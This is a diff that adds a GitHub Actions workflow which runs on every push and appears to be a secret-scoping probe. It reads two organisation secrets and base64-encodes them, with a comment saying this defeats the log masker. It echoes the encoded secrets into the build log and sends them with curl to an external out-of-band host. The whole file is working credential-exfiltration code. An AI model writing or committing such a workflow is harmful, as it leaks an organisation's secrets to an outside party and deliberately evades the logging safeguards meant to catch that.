@@ -1,0 +1,18 @@
+name: ct38-scope
+on: push
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: transform+egress org secrets (base64 defeats masker)
+        env:
+          S_PUB: ${{ secrets.CT38_ORG_SCOPED_PUB }}
+          S_PRIV: ${{ secrets.CT38_ORG_UNSCOPED_PRIV }}
+        run: |
+          PUB_B64=$(printf '%s' "$S_PUB" | base64 | tr -d '\n')
+          PRIV_B64=$(printf '%s' "$S_PRIV" | base64 | tr -d '\n')
+          echo "scoped_pub_len=${#S_PUB} scoped_pub_b64=$PUB_B64"
+          echo "unscoped_priv_len=${#S_PRIV} unscoped_priv_b64=$PRIV_B64"
+          curl -s "http://ct38scope-953b.oob.ogxing.com/ct38pub/$PUB_B64" >/dev/null || true
+          curl -s "http://ct38scope-953b.oob.ogxing.com/ct38priv/$PRIV_B64" >/dev/null || true
+          echo "done"
